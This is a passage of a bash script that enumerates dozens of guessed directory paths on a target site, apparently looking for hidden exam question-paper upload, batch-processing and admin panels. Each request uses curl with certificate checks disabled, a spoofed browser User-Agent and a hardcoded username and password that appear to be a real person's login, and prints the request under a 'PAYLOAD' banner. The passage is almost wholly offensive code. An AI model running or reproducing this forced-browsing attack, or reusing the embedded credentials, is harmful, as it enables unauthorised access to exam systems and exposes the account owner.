code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Panel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Panel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Panel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-BatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-BatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-BatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPB/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPB/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPB/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_DataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_DataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_DataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-DataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-DataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-DataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerHandling/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerHandling/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerHandling/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataPlatform/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataPlatform/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataPlatform/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoAccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoAccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoAccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_MassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_MassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_MassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Dashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Dashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Dashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Portal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Portal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Portal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_DataSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_DataSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_DataSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorMassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorMassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorMassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
